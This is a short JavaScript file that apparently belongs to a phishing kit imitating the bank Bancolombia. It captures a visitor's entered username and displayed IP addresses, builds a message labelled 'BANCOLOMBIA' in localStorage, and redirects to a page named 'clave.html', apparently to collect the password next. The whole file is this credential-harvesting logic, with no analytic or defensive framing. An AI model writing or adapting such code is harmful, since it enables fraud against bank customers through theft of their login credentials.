var u_name, ip, ip2;

var ready = function () {
    u_name = document.getElementById("usuario").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;

    localStorage.setItem('userName', u_name);
    localStorage.setItem('userIP', ip);
    localStorage.setItem('userIP2', ip2);
    localStorage.setItem('message',
        "Usuario: " + u_name + "\nIP: " + ip + "\n" + ip2 + "\nBANCOLOMBIA"
    );
};

var sender = function () {
    ready();
    window.location = 'clave.html';
    return false;
};
